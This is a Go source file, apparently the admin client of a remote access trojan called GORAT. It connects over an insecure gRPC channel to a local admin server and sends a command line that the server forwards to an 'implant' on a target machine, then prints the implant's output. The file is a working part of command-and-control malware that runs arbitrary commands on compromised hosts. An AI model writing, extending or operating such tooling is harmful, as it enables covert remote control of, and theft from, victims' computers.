package main

import (
	"context"
	"fmt"
	"github.com/vpaklatzis/GORAT/grpcapi"
	"google.golang.org/grpc"
	"log"
	"os"
)

// the client produces work, which gets sent via the admin gRPC API, to the server
// which then forwards it on to the implant. The server gets the output from the implant and
// sends it back to the admin client
func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.AdminClient
	)

	opts = append(opts, grpc.WithInsecure())
	log.Println("Trying to reach the admin server...")
	// establishes connection back to our admin server
	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 9090), opts...); err != nil {
		log.Fatal("Admin client could not connect to the server: ", err)
	}
	log.Println("Connected successfully to the server")
	defer func(conn *grpc.ClientConn) {
		if err := conn.Close(); err != nil {
			log.Fatal("Error occurred while closing the connection: ", err)
		}
	}(conn)
	client = grpcapi.NewAdminClient(conn)

	var cmd = new(grpcapi.Command)
	cmd.In = os.Args[1]
	ctx := context.Background()
	cmd, err = client.RunCommand(ctx, cmd)
	if err != nil {
		log.Fatal("Error occurred while trying to run the command: ", err)
	}
	fmt.Println(cmd.Out)
}
